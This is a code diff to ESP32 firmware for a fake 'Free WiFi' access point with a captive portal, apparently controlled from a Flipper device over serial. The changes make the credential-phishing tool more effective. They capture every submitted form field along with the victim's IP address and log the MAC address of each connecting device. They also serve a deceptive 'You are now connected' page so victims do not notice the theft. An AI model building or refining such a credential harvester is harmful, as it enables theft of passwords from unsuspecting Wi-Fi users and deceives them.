@@ -25,10 +25,27 @@ static char index_html[MAX_HTML_SIZE + 1] =
 static size_t index_html_len = 0;
 static char apName[MAX_SSID + 1] = "Free WiFi";
 
+// Served after a credential submission (instead of re-showing the login).
+static const char success_html[] =
+    "<!doctypehtml><html><head><meta name=viewport "
+    "content='width=device-width,initial-scale=1'><title>Connecting</title></head>"
+    "<body style='font-family:sans-serif;text-align:center;padding-top:60px'>"
+    "<h2>Connecting&hellip;</h2><p>You are now connected to the internet.</p></body></html>";
+static const size_t success_html_len = sizeof(success_html) - 1;
+
 static DNSServer dnsServer;
 static AsyncWebServer server(80);
 static bool portalRunning = false;
 static IPAddress apIP(192, 168, 4, 1);
+
+// Protocol lines are emitted from three tasks (loop, WiFi event, async web
+// server). Serialize whole lines so they can't interleave and desync the Flipper.
+static SemaphoreHandle_t serialMutex = NULL;
+static void emitLine(const String& s) {
+    if(serialMutex) xSemaphoreTake(serialMutex, portMAX_DELAY);
+    Serial.println(s);
+    if(serialMutex) xSemaphoreGive(serialMutex);
+}
 
 // Serial command / html-stream state
 static String lineBuf;
@@ -56,17 +73,17 @@ static String urlencode(const String& s) {
 static void captureParams(AsyncWebServerRequest* request) {
     int n = request->params();
     if(n <= 0) return;
-    String out = "CRED ";
-    bool first = true;
+    // Prefix the requester's IP so submissions from different devices are distinct.
+    String out = "CRED ip=";
+    out += request->client()->remoteIP().toString();
     for(int i = 0; i < n; i++) {
         const AsyncWebParameter* p = request->getParam(i);
-        if(!first) out += "&";
-        first = false;
+        out += "&";
         out += urlencode(p->name());
         out += "=";
         out += urlencode(p->value());
     }
-    Serial.println(out);
+    emitLine(out);
 }
 
 class CaptiveHandler : public AsyncWebHandler {
@@ -78,15 +95,23 @@ public:
         return true; // handle every host/path so the captive portal always shows
     }
     void handleRequest(AsyncWebServerRequest* request) override {
-        captureParams(request);
-        request->send(200, "text/html", (const uint8_t*)index_html, index_html_len);
+        if(request->params() > 0) {
+            // A form was submitted: log it and show a believable success page.
+            captureParams(request);
+            request->send(200, "text/html", (const uint8_t*)success_html, success_html_len);
+        } else {
+            request->send(200, "text/html", (const uint8_t*)index_html, index_html_len);
+        }
     }
 };
 
 static void onStaConnect(WiFiEvent_t event, WiFiEventInfo_t info) {
     (void)event;
-    (void)info;
-    Serial.println("HIT");
+    const uint8_t* m = info.wifi_ap_staconnected.mac;
+    char mac[18];
+    snprintf(
+        mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X", m[0], m[1], m[2], m[3], m[4], m[5]);
+    emitLine(String("HIT mac=") + mac);
 }
 
 static void startPortal() {
@@ -100,8 +125,7 @@ static void startPortal() {
     server.begin();
     portalRunning = true;
 
-    Serial.print("STATUS portal_up ip=");
-    Serial.println(WiFi.softAPIP());
+    emitLine("STATUS portal_up ip=" + WiFi.softAPIP().toString());
 }
 
 static void stopPortal() {
@@ -111,7 +135,7 @@ static void stopPortal() {
         WiFi.softAPdisconnect(true);
         portalRunning = false;
     }
-    Serial.println("STATUS stopped");
+    emitLine("STATUS stopped");
 }
 
 static void processCommand(String cmd) {
@@ -120,16 +144,21 @@ static void processCommand(String cmd) {
         String s = cmd.substring(6);
         s.trim();
         strlcpy(apName, s.c_str(), sizeof(apName));
-        Serial.println("STATUS ap_ok");
+        emitLine("STATUS ap_ok");
     } else if(cmd.startsWith("sethtml ")) {
         long n = cmd.substring(8).toInt();
         if(n < 0) n = 0;
+        if((size_t)n > MAX_HTML_SIZE) {
+            // Bogus/oversized length — reject instead of wedging the reader.
+            emitLine("STATUS html_err");
+            return;
+        }
         htmlRemaining = (size_t)n;
         htmlPos = 0;
         if(htmlRemaining == 0) {
             index_html[0] = '\0';
             index_html_len = 0;
-            Serial.println("STATUS html_ok");
+            emitLine("STATUS html_ok");
         } else {
             readingHtml = true;
         }
@@ -138,7 +167,7 @@ static void processCommand(String cmd) {
     } else if(cmd == "stop") {
         stopPortal();
     } else if(cmd == "reset") {
-        Serial.println("STATUS resetting");
+        emitLine("STATUS resetting");
         delay(50);
         ESP.restart();
     }
@@ -156,7 +185,7 @@ static void pumpSerial() {
                 index_html[stored] = '\0';
                 index_html_len = stored;
                 readingHtml = false;
-                Serial.println("STATUS html_ok");
+                emitLine("STATUS html_ok");
             }
         } else if(c == '\n') {
             processCommand(lineBuf);
@@ -169,13 +198,14 @@ static void pumpSerial() {
 }
 
 void setup() {
+    serialMutex = xSemaphoreCreateMutex();
     Serial.setRxBufferSize(2048);
     Serial.begin(115200);
     delay(100);
     index_html_len = strlen(index_html);
     WiFi.onEvent(onStaConnect, ARDUINO_EVENT_WIFI_AP_STACONNECTED);
     lineBuf.reserve(210);
-    Serial.println("STATUS boot");
+    emitLine("STATUS boot");
 }
 
 void loop() {
